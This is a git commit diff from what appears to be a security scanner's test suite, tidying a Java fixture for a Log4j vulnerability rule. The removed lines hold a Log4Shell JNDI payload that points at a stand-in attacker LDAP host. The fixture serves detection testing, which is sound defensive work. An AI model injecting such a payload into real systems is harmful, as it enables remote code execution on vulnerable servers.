279935850db4360a2aebc8257a393d1748edffb9
elsapet <elizabeth@bearer.sh>
2024-02-16 10:01:56 +0200

    fix: clean up testdata

--- tests/java/lang/log4j/testdata/insecure/main.java
+++ tests/java/lang/log4j/testdata/insecure/main.java
@@ -5,10 +5,6 @@ public class Foo {
   // bearer:expected java_lang_log4j
   private static final Logger LOGGER = LogManager.getLogger(Foo.class);
 
-  // public static void bad() {
-  //   LOGGER.info("${jndi:ldap://attacker-server:1389/Exploit}");
-  // }
-
   public static void bad2() {
     LOGGER.info("outdated version of log4j vulnerability");
   }
